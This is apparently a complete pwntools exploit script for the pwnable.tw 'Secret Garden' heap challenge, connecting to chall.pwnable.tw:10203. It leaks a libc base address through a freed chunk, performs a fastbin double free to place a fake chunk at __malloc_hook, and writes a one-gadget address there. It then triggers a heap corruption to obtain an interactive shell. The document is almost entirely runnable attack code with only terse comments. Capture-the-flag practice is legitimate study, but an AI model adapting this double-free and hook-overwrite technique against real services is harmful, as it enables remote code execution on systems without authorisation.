from pwn import *

local = False

if local:
	r = process("./secretgarden")
	malloc_hook = 0x3c4b10
	onegadget_off = 0xf02a4
else:
	r = remote("chall.pwnable.tw", 10203)	
	malloc_hook = 0x3c3b10
	onegadget_off = 0xef6c4
	
r.recvuntil("Your choice :")

def add(size, name, color):
	r.sendline(str(1))
	r.recvuntil("Length of the name :")
	r.sendline(str(size))
	r.recvuntil("The name of flower :")
	r.send(name)
	r.recvuntil("The color of the flower :")
	r.sendline(color)
	r.recvuntil("Your choice :")
def visit():
	r.sendline(str(2))
	return r.recvuntil("Your choice :")
def remove(index):
	r.sendline(str(3))
	r.sendlineafter(":", str(index))
	r.recvuntil("Your choice :")
def clean():	
	r.sendline(str(4))
	r.recvuntil("Your choice :")
# setup
# 0 
add(0x60, "\n", "color0")
# 1
add(0x60, "\n", "color1")
# 2
add(0x100, "\n", "color2")
# 3
add(0x20, "\n", "color3")


# leak libc_base addr base on chunk 0x110, malloc_hook = main_arena - 0x10
remove(2)
clean()
add(0x100, "aaaabbbb", "color2")

result = visit()
result = result.split("bbbb")[1][:6] + "\x00\x00"
libc_base = u64(result) - 88 - 0x10 - malloc_hook
malloc_hook_addr = libc_base + malloc_hook
onegadget_addr = libc_base + onegadget_off

# overwrite __malloc_hook
fake_chunk = malloc_hook_addr - 0x23
payload = "\x00"*0x13 + p64(onegadget_addr)

remove(0)
remove(1)
remove(0)
clean()

add(0x60, p64(fake_chunk), "color0")
add(0x60, "\n", "color1")
# 4 
add(0x60, "\n", "color4")

# 5 
add(0x60, payload, "nocolor")

# make heap corrupt to trigger __malloc_hook
remove(0)
#remove(0)
r.sendline(str(3))
r.sendlineafter(":", str(0))

r.interactive()

# overwrite __malloc_hook
# make heap corrupt to trigger __malloc_hook
